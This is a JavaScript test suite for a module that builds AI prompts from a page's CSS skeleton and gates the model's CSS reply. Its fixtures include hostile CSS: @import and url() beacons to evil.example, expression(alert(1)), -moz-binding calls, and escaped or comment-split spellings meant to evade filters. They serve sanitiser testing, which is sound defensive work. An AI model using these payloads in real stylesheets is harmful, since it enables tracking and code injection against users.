// b2 — AI CSS Boosts: the pure generation module (SDD RED). Spec:
// overlay/specs/b2-ai-css-boosts.md §2, §3, §4 tests 1–13.
//
// Contract pinned here for overlay/chrome/JS/aether-boost-gen.sys.mjs (pure —
// no Services/DOM/fetch/IOUtils at top level; Node-importable):
//   serializeSkeleton(sample) -> deterministic skeleton string from the child's
//     structural sample. Sample shape (as collected by Aether:BoostSample):
//       { selectors: [{ tag, id, classes: [..], count,
//                       color, background, fontFamily, fontSize }, ...],
//         histogram: [{ color, count }, ...] }
//     The whitelist is enforced HERE too (belt and suspenders with the child):
//     only tag/id/classes, the four computed props, and histogram color/count
//     are ever emitted — extra fields on the objects (textContent, href,
//     title, value, arbitrary keys) never leak into the output. Caps at 40
//     selectors, top by count. Empty/hostile input -> a valid string, never a
//     throw.
//   buildBoostPrompt(skeleton, palette) -> the model prompt: contains the
//     skeleton verbatim, every palette entry as a `--aether-<key>: <value>`
//     pair (palette is the f3 theme-state map, e.g. {background: "#1d2021",
//     color4: "#458588", ...}), and the strict output instructions (CSS only,
//     exactly one fenced code block, no @import / url() / JS).
//   extractCss(replyText) -> the content of the SINGLE fenced code block
//     (```css and bare ``` fences both accepted), or null: zero fences, two or
//     more fences, unfenced text, non-string input all reject — never a guess,
//     never concatenation, never first-wins, never a throw.
//   acceptanceGate(rawCss) -> {ok, css, removedRules[], reason?}: runs the
//     b1-shared sanitizer (aether-boosts sanitizeCss semantics: @import gone,
//     url() except data: gone) PLUS expression(...) and -moz-binding, each
//     stripped rule named in removedRules; hard 32 KiB size cap (constant, not
//     config) — oversize is {ok: false, reason}, rejected whole, never
//     silently truncated. Clean CSS -> {ok: true, css byte-identical,
//     removedRules: []}. The surviving CSS re-sanitizes to itself.
//   generatedHeader(domain, dateStr) -> the dated CSS comment block header
//     appended above accepted CSS; two accepts = two independent dated blocks
//     (append semantics, no merging — mirrors b1 zap test 12).

import { test } from "node:test";
import assert from "node:assert/strict";

import {
  serializeSkeleton,
  buildBoostPrompt,
  extractCss,
  acceptanceGate,
  generatedHeader,
} from "../../chrome/JS/aether-boost-gen.sys.mjs";
import { sanitizeCss } from "../../chrome/JS/aether-boosts.sys.mjs";

// A representative clean sample — every whitelisted field populated.
const SAMPLE = {
  selectors: [
    {
      tag: "body", id: null, classes: [], count: 1,
      color: "rgb(60, 56, 54)", background: "rgb(251, 241, 199)",
      fontFamily: "system-ui", fontSize: "16px",
    },
    {
      tag: "div", id: "hero", classes: ["card", "wide"], count: 12,
      color: "rgb(29, 32, 33)", background: "rgb(213, 196, 161)",
      fontFamily: "monospace", fontSize: "14px",
    },
    {
      tag: "a", id: null, classes: ["nav-link"], count: 34,
      color: "rgb(7, 102, 120)", background: "rgba(0, 0, 0, 0)",
      fontFamily: "system-ui", fontSize: "13px",
    },
  ],
  histogram: [
    { color: "rgb(102, 92, 84)", count: 40 },
    { color: "rgb(60, 56, 54)", count: 21 },
  ],
};

// A hostile sample: every entry smuggles fields outside the whitelist. The
// serializer must copy fields BY NAME — these values must never appear.
const SENTINELS = [
  "SENTINEL-TEXT-a9x page prose that must never leave",
  "https://exfil.example/SENTINEL-HREF-b7k",
  "SENTINEL-TITLE-c3m",
  "SENTINEL-VALUE-d1q hunter2",
  "SENTINEL-ARBITRARY-e5z",
  "SENTINEL-HISTO-f8w",
];
const HOSTILE_SAMPLE = {
  selectors: [
    {
      tag: "p", id: "safeid", classes: ["ok-class"], count: 5,
      color: "rgb(0, 0, 0)", background: "rgb(255, 255, 255)",
      fontFamily: "serif", fontSize: "12px",
      textContent: SENTINELS[0],
      href: SENTINELS[1],
      title: SENTINELS[2],
      value: SENTINELS[3],
      dataSecret: SENTINELS[4],
    },
  ],
  histogram: [{ color: "rgb(1, 2, 3)", count: 2, note: SENTINELS[5] }],
};

// 1. deterministic serialization; every whitelisted field appears ------------

test("boost-gen: serializeSkeleton is deterministic — same sample, byte-identical output", () => {
  const once = serializeSkeleton(SAMPLE);
  const again = serializeSkeleton(structuredClone(SAMPLE));
  assert.equal(typeof once, "string");
  assert.ok(once.length > 0, "a populated sample yields a non-empty skeleton");
  assert.equal(again, once, "same sample twice -> byte-identical skeleton");
});

test("boost-gen: every whitelisted field of the sample appears in the skeleton", () => {
  const out = serializeSkeleton(SAMPLE);
  // selector parts
  for (const part of ["body", "div", "hero", "card", "wide", "a", "nav-link"]) {
    assert.ok(out.includes(part), `selector part '${part}' must be in the skeleton`);
  }
  // the four computed props, per selector
  for (const val of [
    "rgb(60, 56, 54)", "rgb(251, 241, 199)", "system-ui", "16px",
    "rgb(29, 32, 33)", "rgb(213, 196, 161)", "monospace", "14px",
    "rgb(7, 102, 120)", "rgba(0, 0, 0, 0)", "13px",
  ]) {
    assert.ok(out.includes(val), `computed value '${val}' must be in the skeleton`);
  }
  // histogram entries: color and count
  assert.ok(out.includes("rgb(102, 92, 84)"), "histogram color must be in the skeleton");
  assert.ok(out.includes("40"), "histogram count must be in the skeleton");
  assert.ok(out.includes("21"), "histogram count must be in the skeleton");
});

// 2. whitelist under hostile input -------------------------------------------

test("boost-gen: smuggled non-whitelist fields never reach the skeleton", () => {
  const out = serializeSkeleton(HOSTILE_SAMPLE);
  assert.equal(typeof out, "string");
  for (const sentinel of SENTINELS) {
    assert.ok(
      !out.includes(sentinel),
      `smuggled value leaked into the skeleton: ${JSON.stringify(sentinel)}`,
    );
    // fragments too — a JSON.stringify of the whole object would carry these
    assert.ok(
      !out.includes("SENTINEL-"),
      `a sentinel fragment leaked into the skeleton: ${JSON.stringify(out)}`,
    );
  }
  assert.ok(out.includes("safeid"), "the whitelisted id still serializes");
  assert.ok(out.includes("ok-class"), "the whitelisted class still serializes");
});

// 3. the 40-selector cap; hostile emptiness never throws ----------------------

test("boost-gen: more than 40 selectors in -> at most 40 out, top by count", () => {
  const selectors = [];
  for (let i = 0; i < 50; i++) {
    selectors.push({
      tag: "div", id: null, classes: [`b2cap${String(i).padStart(2, "0")}`],
      count: i + 1, // b2cap49 is the most common, b2cap00 the rarest
      color: "rgb(0, 0, 0)", background: "rgb(255, 255, 255)",
      fontFamily: "serif", fontSize: "12px",
    });
  }
  const out = serializeSkeleton({ selectors, histogram: [] });
  const kept = new Set(out.match(/b2cap\d\d/g) ?? []);
  assert.ok(kept.size <= 40, `at most 40 selectors may survive, got ${kept.size}`);
  assert.ok(kept.has("b2cap49"), "the most common selector survives");
  for (let i = 0; i < 10; i++) {
    const name = `b2cap${String(i).padStart(2, "0")}`;
    assert.ok(!kept.has(name), `low-count selector '${name}' must be cut (top-by-count cap)`);
  }
});

test("boost-gen: empty or missing sample -> a valid skeleton string, never a throw", () => {
  for (const sample of [undefined, null, {}, { selectors: null, histogram: "junk" }, { selectors: [], histogram: [] }]) {
    const out = serializeSkeleton(sample);
    assert.equal(typeof out, "string", `serializeSkeleton(${JSON.stringify(sample)}) must yield a string`);
  }
});

// 4. buildBoostPrompt: skeleton + palette + strict output instructions --------

test("boost-gen: the prompt carries the skeleton, every --aether-* pair, and the output rules", () => {
  const skeleton = serializeSkeleton(SAMPLE);
  const palette = {
    background: "#1d2021",
    foreground: "#ebdbb2",
    color4: "#458588",
    color9: "#fb4934",
  };
  const prompt = buildBoostPrompt(skeleton, palette);
  assert.equal(typeof prompt, "string");
  assert.ok(prompt.includes(skeleton), "the serialized skeleton is in the prompt verbatim");
  for (const [key, value] of Object.entries(palette)) {
    assert.ok(prompt.includes(`--aether-${key}`), `palette var name '--aether-${key}' must be in the prompt`);
    assert.ok(prompt.includes(value), `palette value '${value}' must be in the prompt`);
  }
  assert.ok(/css/i.test(prompt), "the prompt names CSS as the only output");
  assert.ok(
    /(exactly one|one|single)[^\n]*code block/i.test(prompt),
    "the prompt demands a single fenced code block",
  );
  assert.ok(prompt.includes("@import"), "the prompt states the no-@import rule");
  assert.ok(prompt.includes("url("), "the prompt states the url() rule");
});

test("boost-gen: page-derived prompt content is selectors and CSS values only — sentinels never reach the model", () => {
  const skeleton = serializeSkeleton(HOSTILE_SAMPLE);
  const prompt = buildBoostPrompt(skeleton, { background: "#1d2021" });
  assert.ok(
    !prompt.includes("SENTINEL-"),
    "no smuggled page string may reach the prompt",
  );
  assert.ok(prompt.includes("safeid"), "the structural selector part does go out");
});

// 5. extractCss: exactly one fenced block -> its content ----------------------

test("boost-gen: one ```css fenced block -> its content, prose discarded", () => {
  const reply = [
    "Sure — here is a reskin for this page.",
    "",
    "```css",
    "body { background: #b16286; }",
    "```",
    "",
    "Enjoy!",
  ].join("\n");
  const out = extractCss(reply);
  assert.equal(typeof out, "string", "a single fenced block extracts");
  assert.equal(out.trim(), "body { background: #b16286; }");
  assert.ok(!out.includes("```"), "fences are not part of the CSS");
  assert.ok(!out.includes("Enjoy"), "surrounding prose is discarded");
});

test("boost-gen: a bare ``` fence (no language tag) is accepted too", () => {
  const reply = "here:\n```\n.a { color: #fb4934; }\n```";
  const out = extractCss(reply);
  assert.equal(typeof out, "string");
  assert.equal(out.trim(), ".a { color: #fb4934; }");
});

// 6. zero fenced blocks -> rejection, never a guess ---------------------------

test("boost-gen: prose-only reply -> null, never a guess", () => {
  assert.equal(extractCss("I would make the background purple and the text cream."), null);
});

test("boost-gen: bare unfenced CSS -> null — a fence is the contract, not a heuristic", () => {
  assert.equal(extractCss("body { background: #b16286; }"), null);
});

test("boost-gen: hostile non-string input -> null, never a throw", () => {
  assert.equal(extractCss(null), null);
  assert.equal(extractCss(undefined), null);
});

// 7. two fenced blocks -> rejection: never concatenation, never first-wins ----

test("boost-gen: two fenced blocks -> null", () => {
  const reply = [
    "First:",
    "```css",
    ".a { color: red; }",
    "```",
    "and separately:",
    "```css",
    ".b { color: blue; }",
    "```",
  ].join("\n");
  assert.equal(extractCss(reply), null, "two blocks reject — no concatenation, no first-wins");
});

// 8. acceptanceGate strips the fetch vectors and names each removal -----------

test("boost-gen: gate on @import + remote url() beacons — survivors intact, removals named, output stable", () => {
  const raw = [
    "/* keep me */",
    ".keep1 { color: #fb4934; }",
    '@import url("https://evil.example/steal.css");',
    ".keep2 { margin: 0; }",
    ".beacon { background-image: url(https://evil.example/p.png?c=beacon); }",
    ".keep3 { padding: 0; }",
  ].join("\n");
  const res = acceptanceGate(raw);
  assert.equal(res.ok, true, "stripping is not rejection — the survivors are accepted");
  assert.equal(typeof res.css, "string");
  for (const cls of [".keep1", ".keep2", ".keep3"]) {
    assert.ok(res.css.includes(cls), `benign rule ${cls} survives the gate`);
  }
  assert.ok(!/@import/i.test(res.css), "the @import is gone");
  assert.ok(!res.css.includes("evil.example"), "the beacon URL is gone");
  assert.ok(Array.isArray(res.removedRules), "removedRules is an array");
  assert.ok(res.removedRules.length >= 2, "both stripped rules are reported");
  assert.ok(
    res.removedRules.some(r => /@import/i.test(r)),
    `a removal names the @import, got ${JSON.stringify(res.removedRules)}`,
  );
  assert.ok(
    res.removedRules.some(r => String(r).includes("evil.example/p.png")),
    `a removal names the beacon url, got ${JSON.stringify(res.removedRules)}`,
  );
  // the surviving CSS is stable under the shared b1 sanitizer — one trust path
  assert.equal(sanitizeCss(res.css), res.css, "gate output re-sanitizes to itself");
});

// 9. url(data:) survives — the b1 contract holds through b2 -------------------

test("boost-gen: url(data:...) survives the gate", () => {
  const raw = ".ok { background: url(data:image/png;base64,AAAA); }";
  const res = acceptanceGate(raw);
  assert.equal(res.ok, true);
  assert.ok(/url\(\s*['"]?data:/i.test(res.css), `the data: URI must survive, got ${JSON.stringify(res.css)}`);
  assert.deepEqual(res.removedRules, [], "nothing to strip, nothing reported");
});

// 10. expression(...) / -moz-binding stripped and reported --------------------

test("boost-gen: expression() and -moz-binding are stripped and named", () => {
  const raw = [
    ".keep { color: red; }",
    ".a { width: expression(alert(1)); }",
    '.b { -moz-binding: url("http://evil.example/x.xml#p"); }',
    ".c { -moz-binding: url(data:text/xml;charset=utf-8,evil); }",
  ].join("\n");
  const res = acceptanceGate(raw);
  assert.equal(res.ok, true);
  assert.ok(res.css.includes(".keep"), "the benign rule survives");
  assert.ok(!/expression\s*\(/i.test(res.css), `expression() survived: ${JSON.stringify(res.css)}`);
  assert.ok(!/-moz-binding/i.test(res.css), `-moz-binding survived (data: url is no excuse — XBL executes): ${JSON.stringify(res.css)}`);
  assert.ok(
    res.removedRules.some(r => /expression/i.test(r)),
    `a removal names expression(), got ${JSON.stringify(res.removedRules)}`,
  );
  assert.ok(
    res.removedRules.some(r => /-moz-binding/i.test(r)),
    `a removal names -moz-binding, got ${JSON.stringify(res.removedRules)}`,
  );
});

// 10b. escaped / comment-split spellings of the executable vectors ------------
// The CSS tokenizer decodes escapes ('-moz-\62 inding' -> '-moz-binding',
// '\65xpression' -> 'expression') and allows comments wherever whitespace
// goes ('-moz-binding/**/:') BEFORE it recognizes tokens — so a literal-only
// match would show 'nothing stripped' while the dotfile carries the vector.
// The gate must strip these in decoded space and report each one.

test("boost-gen: escaped and comment-split executable spellings are stripped and named", () => {
  const raw = [
    ".keep { color: red; }",
    ".a { -moz-\\62 inding: url(data:text/xml,evil); }",
    ".b { -moz-binding/**/: url(data:text/xml,evil); }",
    ".c { width: \\65xpression(alert(1)); }",
  ].join("\n");
  const res = acceptanceGate(raw);
  assert.equal(res.ok, true);
  assert.ok(res.css.includes(".keep"), "the benign rule survives");
  assert.ok(
    !/-moz-binding|-moz-\\62\s?inding/i.test(res.css),
    `an escaped/comment-split -moz-binding survived: ${JSON.stringify(res.css)}`,
  );
  assert.ok(
    !/expression\s*\(|\\65\s?xpression/i.test(res.css),
    `an escaped expression() survived: ${JSON.stringify(res.css)}`,
  );
  assert.equal(res.removedRules.length, 3, "each of the three vectors is reported, none passes silently");
  // the strip summary never lies: the surviving CSS is stable under the gate
  const again = acceptanceGate(res.css);
  assert.equal(again.css, res.css, "gate output is a gate fixpoint");
  assert.deepEqual(again.removedRules, [], "nothing left to strip on re-entry");
});

test("boost-gen: benign escapes still pass byte-identical (the decode probe never rewrites clean CSS)", () => {
  const clean = [
    "/* escaped identifier from a zap selector */",
    "#\\31 23-id { color: #fabd2f; }",
    '.quote::before { content: "\\201C"; }',
  ].join("\n");
  const res = acceptanceGate(clean);
  assert.equal(res.ok, true);
  assert.deepEqual(res.removedRules, []);
  assert.equal(res.css, clean, "benign escapes are not an excuse to rewrite the text");
});

// 11. oversize CSS is rejected whole — never silently truncated ---------------

test("boost-gen: CSS over the 32 KiB cap -> {ok: false, reason}, rejected whole", () => {
  const line = ".b2-fill { color: #b16286; padding: 0; }\n"; // 41 bytes
  const big = line.repeat(900); // ~36 KiB > 32768
  assert.ok(big.length > 32 * 1024, "fixture sanity: the input exceeds the cap");
  const res = acceptanceGate(big);
  assert.equal(res.ok, false, "oversize is a rejection, not a truncation");
  assert.equal(typeof res.reason, "string");
  assert.ok(res.reason.length > 0, "the rejection carries a reason");
  assert.ok(!res.css, "no partial CSS comes back — rejected whole");
});

test("boost-gen: CSS under the 32 KiB cap passes — the cap is 32 KiB, not smaller", () => {
  const line = ".b2-fill { color: #b16286; padding: 0; }\n"; // 41 bytes
  const nearCap = line.repeat(700); // ~28 KiB < 32768
  assert.ok(nearCap.length < 32 * 1024, "fixture sanity: the input is under the cap");
  const res = acceptanceGate(nearCap);
  assert.equal(res.ok, true, "clean CSS under the cap is accepted");
});

// 12. clean CSS: ok, nothing removed, byte-identical --------------------------

test("boost-gen: clean CSS -> ok, removedRules empty, css byte-identical", () => {
  const clean = [
    "/* generated reskin */",
    "body { background: #1d2021 !important; color: #ebdbb2 !important; }",
    "h1 { color: #fabd2f; }",
  ].join("\n");
  const res = acceptanceGate(clean);
  assert.equal(res.ok, true);
  assert.deepEqual(res.removedRules, []);
  assert.equal(res.css, clean, "clean CSS passes byte-identical");
});

// 13. generatedHeader: dated, domain-naming, append-only ----------------------

test("boost-gen: generatedHeader carries the domain and the date, inside a CSS comment", () => {
  const header = generatedHeader("example.com", "2026-08-11");
  assert.equal(typeof header, "string");
  assert.ok(header.includes("example.com"), "the domain is in the header");
  assert.ok(header.includes("2026-08-11"), "the supplied date is in the header");
  assert.match(header, /\/\*[\s\S]*\*\//, "the header lives in a CSS comment");
});

test("boost-gen: two accepts are two independent dated blocks — append, never merge", () => {
  const one = generatedHeader("example.com", "2026-08-11");
  const again = generatedHeader("example.com", "2026-08-11");
  assert.equal(again, one, "same input, same header — deterministic");
  const appended = `${one}\n.a { color: red; }\n${again}\n.b { color: blue; }\n`;
  const headers = appended.split("2026-08-11").length - 1;
  assert.equal(headers, 2, "appending twice keeps both dated headers — no merging, no dedup");
  assert.ok(appended.includes(".a {"), "the first accepted block survives the second accept");
  assert.ok(appended.includes(".b {"), "the second block lands after the first");
});
